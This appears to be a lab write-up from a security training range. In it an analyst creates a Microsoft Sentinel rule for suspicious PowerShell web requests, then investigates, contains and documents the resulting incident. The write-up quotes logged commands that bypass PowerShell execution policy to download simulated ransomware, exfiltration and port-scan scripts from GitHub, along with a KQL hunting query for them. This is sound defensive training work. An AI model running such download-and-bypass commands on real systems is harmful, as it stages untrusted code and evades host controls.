# Alert Rule: Powershell Suspicious Web Requests
h

##  Scenario

Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.




---
## Platforms and Languages Leveraged
- Microsoft Sentinel
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
## Steps Taken

## Part 1: Create Alert Rule (PowerShell Suspicious Web Request)

Created a Sentinel scheduled query rule within Log Analytics that will discover when PowerShell is detected using Invoke-WebRequest to download content.

Sentinel → Analytics → Schedule Query Rule

**Query used to locate events:**


<img width="858" height="176" alt="Invoke-WebRequest-Rule" src="https://github.com/user-attachments/assets/03c7084d-41bb-4bde-bc39-1da5ad83bc81" />

---

## Part 2: Wait for Alert to trigger an Incident

Once alert the alert triggered and created an incident, I assigned it to myself and proceeded to investigate the incident. 

<img width="957" height="973" alt="IncidentSC" src="https://github.com/user-attachments/assets/52189051-6a0c-4a96-ac2c-2ed7dc4fb1b1" />

## Part 3: Work Incident
Next I worked the incident to completion, in accordance with the NIST 800-61: Incident Response Lifecycle

### Preparation
- Document roles, responsibilities, and procedures.
Ensure tools, systems, and training are in place.

(Preparation phase already in place, assuming the company already has enviornment stood up etc.)

### Detection and Analysis
- I identified and validated that the incident was a true positive.
- I continued to investigate the alert/logs.
Upon investigating the triggered incident "DH - Suspicious PowerShell Web Request"
It was discovered that the following commands were run on the machine:

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/JM/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/JM/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/JM/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/JM/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`

---

After investigating the logs, I created another query to determine wether the downloaded files were executed. 
…

**Query used to locate events:**

```kql

let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); 
DeviceProcessEvents
| where TimeGenerated >= todatetime('2025-10-25T08:48:53.3638496Z')
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine

```
<img width="849" height="205" alt="executedscripts" src="https://github.com/user-attachments/assets/37e769cd-f605-43ab-8715-17ef360264c8" />


---

### Containment, Eradication, and Recovery

Since it was determined these potentially malicious files were donwloaded and executed, to prevent further damage/infection to the network I isolated the device "windows-target-1" using Microsoft Defender for Endpoint and ran an Anti-Virus scan of the device. 

<img width="326" height="524" alt="image" src="https://github.com/user-attachments/assets/f6c117ba-5315-4e14-8353-608d473335fe" />

After analyzing all the scripts, I determined they were used to download and execute other powershell scripts from the internet to the C:\programdata folder on the device "windows-target-1"

Passed the scripts to a malware analysis team to reverse engineer the malware and here are the results
- Script ending in "eicar.ps1" was observed to create an EICAR test file, a standard for testing anitvirus solution, and logs the proccess.
- Script ending in "exfiltratedata.ps1" was observed to generate fake employee data, compress into a ZIP file, and upload it to an Azure Blob storage container
- Script ending in "pwncrypt.ps1" was observed to encypt files in a selected user's desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions. 
- Script ending in "portscan.ps1" was observed to scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
  
While the machine was isolated and the antivirus scan was run, it removed the malware from the device. 
Next, I verified the files were actually gone and the computer was back to a normal running state before releasing the device from isolation. 

### Post-Incident Activities

### **Findings**

* PowerShell was used to download four suspicious scripts (`pwncrypt.ps1`, `exfiltratedata.ps1`, `portscan.ps1`, `eicar.ps1`) from GitHub to `C:\ProgramData\`.
* Scripts simulated ransomware, data exfiltration, port scanning, and AV test activity.
* Alerts from Microsoft Sentinel and Defender correctly detected and contained the incident.
* The affected device was isolated, scanned, and cleared of malicious files.

### **Lessons Learned**

This incident highlights that misuse of legitimate administrative tools like PowerShell remains a major attack vector. Sentinel’s detection rules proved effective, demonstrating the value of continuous monitoring and well-defined alert logic. However, response time could be improved through greater automation, such as automatically isolating compromised devices. Additionally, PowerShell execution policies and user permissions were found to be too permissive, underscoring the need for stricter controls and least-privilege enforcement. Furthermore, instead of running removing the threat using antivirus, anohter option is to re-image "windows-target-1" which will restore it to a normal operating state before the malware was downloaded, if the organization permits it. Finally, the event reinforced the importance of ongoing user awareness training on script-based threats and phishing tactics that can deliver malicious PowerShell payloads.


### **Policy & Tool Updates**

* Restrict PowerShell to admins and signed scripts only.
* Deploy Defender ASR rules to block untrusted downloads.
* Automate device isolation in Sentinel for high-severity alerts.
* Add user awareness training on script-based threats.

### **Documentation**

* Incident “DH – Suspicious PowerShell Web Request” recorded with full logs, evidence, and analysis.
* Root cause: misuse of PowerShell to fetch and execute malicious content.
* Status: **Closed** — system restored, controls strengthened, and policies updated.

---



---
